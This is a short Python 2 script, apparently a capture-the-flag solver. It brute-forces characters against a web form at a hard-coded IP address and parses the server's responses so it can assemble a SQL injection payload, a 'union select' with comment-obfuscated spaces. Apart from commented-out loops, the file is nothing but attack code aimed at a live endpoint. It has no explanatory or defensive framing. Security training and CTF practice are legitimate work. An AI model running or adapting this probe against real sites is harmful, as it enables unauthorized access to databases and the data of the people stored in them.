import requests
import re
import string

conn = requests.Session()
url = "http://35.185.187.162:17002/index.php"
alphabet = string.letters + string.digits + "_-!@#$%^&*()+=<,>.?/\\'\"|{[}]"
#union = "union/**/select/**/1/**/--"
payload = "'union/**/select/**/1/**/--"
query = "t"
#print len(query)
#print len(union)
'''
while True:
	for i in range(len(alphabet)):
		try:
			#ej_c
			data = {"query": query + alphabet[i]}
			test = conn.post(url = url, data = data).text
			coba = re.findall(r'telah dibuat : (.*) untuk', test)[0]
			#print coba
			#print alphabet[i], " : ", coba		
			if coba in union:
				print alphabet[i], " : ", coba
				query += alphabet[i]
				print query
		except IndexError:
			continue	
'''
h = 0
#while True: 
for i in range(len(alphabet)):
	try:
		#ej_c
		data = {"query": query + alphabet[i]}
		test = conn.post(url = url, data = data).text
		coba = re.findall(r'insert(.*)', test)[0]
		print alphabet[i], " : ", coba		
		#print coba[8:-2]
		#print coba[9:-2]
		#if coba[8 + h:-2] in payload:
		#	print alphabet[i], " : ", coba[8:-2]
		#	print coba[8 + h:-2], " | ", payload
		#	query += alphabet[i]
		#	print query
		#	h += 1
	except IndexError:
		continue	


#data = {"query": query}
#test = conn.post(url = url, data = data).text
#coba = re.findall(r'insert(.*)', test)[0]
#print coba[7:-2]